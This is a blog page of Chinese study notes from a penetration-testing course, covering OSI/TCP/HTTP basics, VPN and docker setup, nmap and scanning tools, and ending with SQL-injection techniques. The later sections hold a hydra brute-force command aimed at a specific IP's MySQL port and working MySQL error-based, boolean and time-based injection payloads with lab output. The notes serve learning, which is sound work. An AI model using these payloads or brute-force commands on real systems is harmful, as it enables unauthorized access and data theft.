@@ -1,0 +1,989 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-tw">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Http,Mysql，sql注入,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Jaychouzzk's blogs" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="第五周第一天 OSI七层模型 ip    tcp包头    数据  网络层ip  传输层   tcp udp  tcp可靠、面向连接    udp：不可靠、面向无连接  应用层：指定数据的格式  练习：用nc软件查看数据包 端口   0~65535    源端口和目的端口各16位     周知端口0~1023     软件预留端口1024~49151     预留动态端口49152~65535 *">
+<meta name="keywords" content="Http,Mysql，sql注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第四周笔记">
+<meta property="og:url" content="https://jaychouzzk.github.io/2018/12/30/第五周笔记/index.html">
+<meta property="og:site_name" content="Jaychouzzk&#39;s blogs">
+<meta property="og:description" content="第五周第一天 OSI七层模型 ip    tcp包头    数据  网络层ip  传输层   tcp udp  tcp可靠、面向连接    udp：不可靠、面向无连接  应用层：指定数据的格式  练习：用nc软件查看数据包 端口   0~65535    源端口和目的端口各16位     周知端口0~1023     软件预留端口1024~49151     预留动态端口49152~65535 *">
+<meta property="og:locale" content="zh-tw">
+<meta property="og:updated_time" content="2018-12-30T08:26:56.433Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="第四周笔记">
+<meta name="twitter:description" content="第五周第一天 OSI七层模型 ip    tcp包头    数据  网络层ip  传输层   tcp udp  tcp可靠、面向连接    udp：不可靠、面向无连接  应用层：指定数据的格式  练习：用nc软件查看数据包 端口   0~65535    源端口和目的端口各16位     周知端口0~1023     软件预留端口1024~49151     预留动态端口49152~65535 *">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jaychouzzk.github.io/2018/12/30/第五周笔记/">
+
+
+
+
+
+  <title>第四周笔记 | Jaychouzzk's blogs</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-tw">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Jaychouzzk's blogs</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2018/12/30/第五周笔记/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jaychouzzk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jaychouzzk's blogs">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">第四周笔记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-12-30T16:27:02+08:00">
+                2018-12-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>第五周第一天</p>
+<p>OSI七层模型</p>
+<pre><code>ip    tcp包头    数据
+
+网络层ip
+
+传输层   tcp udp
+
+tcp可靠、面向连接    udp：不可靠、面向无连接
+
+应用层：指定数据的格式
+
+练习：用nc软件查看数据包
+</code></pre><p>端口   0~65535    源端口和目的端口各16位</p>
+<pre><code>    周知端口0~1023
+    软件预留端口1024~49151
+    预留动态端口49152~65535
+****常用：53（dns）    21：FTP认证    20：实际传输    23：telnet        25：STMP简单邮件传送    110：POP3接收邮件    80：HTTP    135：smb文件共享    443：https    445：共享服务    1433：sql server        3306：mysql    3389：rdp远程桌面    5432:postgresql        6379:redis        8080:tomcat        10051:zabbix    27017:mongodb
+</code></pre><p>TCP协议：</p>
+<pre><code>三次握手 seq标记    ack=seq标识位置+1        SYN    
+四次挥手                                FIN    
+</code></pre><p>UDP协议：</p>
+<pre><code>IP包头（20字节）+UDP报文头+UDP数据
+特点：更精简，占用资源少
+
+使用wireshark抓包工具抓包
+</code></pre><p><strong><strong>HTTP协议</strong></strong></p>
+<pre><code>特点：
+*简单快速只传送请求方法和路径：GET\POST\HEAD\
+
+*灵活
+
+*无连接：每次连接只处理一个请求即断开
+
+*无状态协议：处理事务没有记忆能力
+
+*支持BS和CS架构
+
+URL：
+
+*http://admin:123@www.baidu.com：80/new/index.php？id=1#
+*协议  + http基础认证  +域名     +端口  +路径  +文件名  +参数  +锚部分
+
+URL编码****
+‘’    --%27
+“”    --%22
+#    --%23
+空格    --%20
+%    --%25
+
+request请求
+1--请求行                
+（2-空白行之前）--请求头    
+
+空白行                
+请求数据
+
+GET请求
+GET  /HTTP基础/123.txt   /HTTP/1.1
+hOST:192.168.11.111:8000
+Accept：*/*
+换行
+
+
+POST请求
+POST /HTTP基础/123.txt   /HTTP/1.1
+hOST:192.168.11.111:8000
+Accept：*/*
+换行
+id=123&amp;password=123
+
+请求方法：
+
+GET
+HEAD  用于捕获报头
+PUT        iis put方法漏洞（自己研究）
+DELETE    请求删除
+CONNECT
+OPTIONS    允许客户端查看服务器支持的方法
+</code></pre><p>练习：用wireshark抓http数据包</p>
+<pre><code>响应    Response
+
+状态行    http/1.1 405 not allowed（状态码）
+响应头
+空行
+相应内容
+
+*状态码   302临时重定向（location）
+        301永久跳转        百度看一下区别
+
+        400
+        403 禁止访问
+        404    Not Found
+        405  不允许
+
+        5xx  服务器问题（代码）
+</code></pre><p><strong>*</strong>重点：  五层模型、tcp三次握手 、 四次挥手 、wireshark、http请求\响应的行、头、空行、内容 、burpSuite代理，看数据包    </p>
+<pre><code>*****晚上总结请求头的含义*****
+
+
+请求头:
+User-Agent             浏览器的标识信息
+Accept-Language     浏览器使用的语言
+Accept                 是指发送的数据类型
+Accept-Encoding     浏览器向中间件发送数据时使用的压缩方式
+
+Host                 访问的网站域名+端口
+Cookie                 网站认证信息
+Referer             上一个打开的网站
+X-Forwarded-For        客户端代理的IP
+</code></pre><p>电脑     192.168.11.111     120.244.111.247</p>
+<p>代理服务器    114.155.123.124     X-Forwarded-For：120.244.111.247</p>
+<p>代理服务器    103.343.32.12    X-Forwarded-For：120.244.111.247,114.155.123.124</p>
+<p>访问     <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>        真实IP 120.244.111.247</p>
+<p>响应头</p>
+<pre><code>Date             日期        GTM时间  和我们UTC时间差8个小时
+Set-Cookie        cookie的来源（给网站设置cookie）
+Content-Type    告诉浏览器返回的内容格式
+Server            显示中间件的版本信息
+X-Powered-By    使用的脚本语言
+</code></pre><p>第五周第三天</p>
+<p>一.安装浏览器插件</p>
+<pre><code>hackbar、Header Edit、wappalzer、 proxy、server ip
+</code></pre><p>二.在windows 2008上搭建vpn</p>
+<pre><code>搭建PPTP连接
+
+1.打开服务管理器---&gt;添加角色----&gt;勾选“网络策略和访问服务 ”------&gt;下一步-----&gt;勾选&quot;路由和远程访问服务&quot;---&gt;开始安装
+
+2.角色中出现了“路由和远程访问”，现在是红色的，右键选择配置它，打开向导---&gt;选择自定义配置--&gt;服务里全选--&gt;完成--&gt;变成绿色
+
+3.新增一个接口：ipv4--&gt;NAT---&gt;新建一个接口--&gt;选择要使用的网卡---&gt;接口类型选择“公用接口连接到Internet”,勾选“在此接口上启用NAT”
+
+4.开始菜单--&gt;管理工具--&gt;网络策略服务器--&gt;策略--&gt;网络策略--&gt;把里面的两项被组织的属性改成“授予访问权限”
+
+5.服务器管理器--&gt;配置--&gt;本地用户和组--&gt;添加一个用户--&gt;填写用户名、密码、勾选“用户不能更改密码”和“密码永不过期”，去掉“下次登陆须更改密码”的勾，点创建。
+
+6.开始菜单--&gt;管理工具--&gt;本地安全策略--&gt;本地策略--&gt;用户权限分配--&gt;拒绝本地登陆，添加vpn用户---&gt;拒绝通过远程桌面登陆,添加vpn用户。
+
+7.连接VPN：在客户机创建一个新连接--&gt;选择连接到工作区---&gt;使用我的internet连接--&gt;填写ip地址--&gt;填写之前创建的VPN用户名和密码--&gt;连接即可
+</code></pre><p>三.docker：<br>        sudo apt-get install docker.io</p>
+<pre><code>安装加速器https://yeasy.gitbooks.io/docker_practice/install/mirror.html
+或者在 /etc/docker/daemon.json 中写入
+{
+  &quot;registry-mirrors&quot;: [&quot;https://registry.docker-cn.com&quot;]
+}
+
+
+sudo docker run --rm -it alpine /bin/sh
+
+
+
+在docker中启动ubuntu：sudo docker run --rm -it ubuntu /bin/sh
+
+在docker中启动centOS：sudo docker run --rm -it centos /bin/sh
+</code></pre><p>四.VPN :PPTP   L2TP </p>
+<pre><code>第一种连接方法：
+1.把镜像拉入虚拟机：
+
+2.docker pull mobtitude/vpn-pptp
+然后创建一个文件chap-secrets，打开写入   name *  password * 并记住路径/vpn-k
+
+3.docker run -d --privileged --net host -v /root/chap-secrets:/ppp/chap-secrets mobtitude/vpn-pptp
+
+
+第二种连接方法：
+1.docker pull hwdsl2/ipsec-vpn-server
+
+2.modprobe af_key
+
+3.VPN_IPSEC_PSK=ipsec-keydoc
+VPN_USER=uname
+VPN_PASSWORD=upass
+
+4.docker run --name vpn-docker --privileged --env-file /root/vpn.env -p 500:500/udp -p 4500:4500/udp -v /lib/modules:/lib/modules:ro  -d --privileged hwdsl2/ipsec-vpn-server
+
+
+第三种方法：
+使用shadowsocks工具代理连接VPN
+
+1.apt install shadowsocks先安装
+
+2.修改配置文件  vi /etc/shadowsocks/config.json
+
+   &quot;server&quot;:&quot;0.0.0.0&quot;,
+    &quot;server_port&quot;:8888,
+    &quot;local_address&quot;: &quot;127.0.0.1&quot;,
+    &quot;local_port&quot;:1080,
+    &quot;password&quot;:&quot;123456&quot;,
+    &quot;timeout&quot;:300,
+    &quot;method&quot;:&quot;aes-256-cfb&quot;,
+    &quot;fast_open&quot;: false,
+    &quot;workers&quot;: 1,
+    &quot;prefer_ipv6&quot;: false
+
+3.（可选）开启BBR加速支持echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.conf
+echo &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf
+sysctl -p
+lsmod | grep bbr
+</code></pre><p>第五周第四天</p>
+<p>渗透测试：白盒黑盒</p>
+<p>流程：</p>
+<pre><code>1.前期沟通
+2.信息搜集（四五天）
+3，威胁建模：根据信息进行分析攻击点（一天）
+4.渗透测试：根据分析进行攻击
+5.后渗透测试：根据测试结果进行更多尝试
+6.写报告
+
+www.exploit-db.com
+https://www.somd5.com/
+https://blog.csdn.net/u012278016/article/details/81772566
+</code></pre><p>扫描工具：</p>
+<pre><code>测网站漏洞工具：
+
+    AWVS（通过爬虫进行网站漏洞测试）的安装
+
+    网站漏洞扫描https://butian.360.cn/Register/补天公益
+
+    啊d--&gt;ASP网站
+
+sql注入工具
+    sqlmap
+
+综合平台类：
+    BurpSuite、Metasploit
+
+搜集域名信息
+    //子域名：news.baidu.com这种
+    子域名挖掘：subDomainsBrute、子域名挖掘机
+
+端口扫描：NMAP---功能强大，隐蔽
+    安装vc扩展、npcap组件，增加环境变量
+    扫描指定ip：    nmap ip
+    原理：只发送SYN，不建立连接
+    nmap -Pn  强制为激活的主机，进行强制扫描
+    nmap -sn  主机发现
+    nmap    -sn -oX     Desktop/report.mxl报告输出到文件
+    nmap -sS    半开放扫描（默认方式）
+    nmap -p 80    指定扫描端口
+    nmap -O    ip    探测操作系统版本
+    nmap -A        详细信息
+    nmap -iL 目录 根据ip列表进行扫描
+    nmap -iL 目录 --webxml 文件名    把结果以xml形式输出到文件
+
+python环境安装
+    1.安装python2.7
+    2.在家目录下创建.pip文件夹，把源文件移动进去
+    3.执行pip install requests
+
+字典生成工具
+pentest.db工具
+    解压，在目录中用cmd执行pip install lxml
+    使用 python pen.py
+    帮助    python pen.py --help
+
+爆破工具
+    *BurpSuite
+    *hydra***   hydra -l用户名 -p密码字典 
+                    -s指定非默认端口
+                    -e ns空密码试探
+                    -f成功后立刻停止
+    例子：hydra -l root -P 目录 -s 3308  -e ns -t 5 114.115.175.102 mysql
+</code></pre><hr>
+<p>报错注入–长度受限制，30个字符</p>
+<pre><code>floor()
+---
+select * from stu where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+ERROR 1062 (23000): Duplicate entry &apos;root@localhost1&apos; for key &apos;group_key&apos;
+---
+select * from stu where id=2 and (select 1 from (select count(*),concat((select mid(group_concat(schema_name),1,153)from information_schema.schemata),floor(rand(0)*2))x from information_schema.tables group by x)a);
+
+ERROR 1062 (23000): Duplicate entry &apos;information_schema,challenges,dvwa,mysql,pentest,performance_sch&apos; for key &apos;group_key&apos;
+---
+
+mid(&apos;hello&apos;,1,1)=&gt;支持老版本
+substr(&apos;hello&apos;,1,1)=&gt;不支持老版本
+
+
+
+extractvalue():
+---
+select * from stu where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;
+---
+select * from stu where id=1 and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables),0x7e)));
+ERROR 1105 (HY000): XPATH syntax error: &apos;~CHARACTER_SETS,COLLATIONS,COLLA&apos;
+---
+
+
+
+updatexml():
+---
+select * from stu where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+ERROR 1105 (HY000): XPATH syntax error: &apos;~root@localhost~&apos;
+---
+select * from stu where id=1 and (updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,25)from information_schema.schemata),0x7e),1));
+ERROR 1105 (HY000): XPATH syntax error: &apos;~information_schema,challe~&apos;
+---
+
+
+
+
+insert:
+
+insert into user(1,2,3) value(&apos;1&apos;,&apos;2&apos;,&apos;3&apos;);
+
+123&apos;,1,2)#
+</code></pre><hr>
+<pre><code>ascii()将字符转为十进制    
+</code></pre><hr>
+<pre><code>Boolean类型盲注：
+
+
+?id=1%27%20%20and mid(user(),1,100)=&apos;root@localhost&apos; #
+---
+
+?id=1%27%20%20and ascii(mid(user(),1,1))&gt;100 #
+---
+(select length(group_concat)from information_schema.schemata)&gt;100
+---
+</code></pre><hr>
+<pre><code>延时盲注：
+
+    1 and sleep(5) %23
+    1) and sleep(5) %23
+    1)) and sleep(5) %23
+    1&apos; and sleep(5) %23
+    1&apos;)
+    1&apos;)) and sleep(5) %23 
+    1&quot; and sleep(5) %23
+    1&quot;) and sleep(5) %23
+    1&quot;)) and sleep(5) %23
+</code></pre>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Http/" rel="tag"># Http</a>
+          
+            <a href="/tags/Mysql，sql注入/" rel="tag"># Mysql，sql注入</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/23/第四周笔记/" rel="next" title="第四周笔记">
+                <i class="fa fa-chevron-left"></i> 第四周笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Jaychouzzk</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">標籤</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jaychouzzk</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
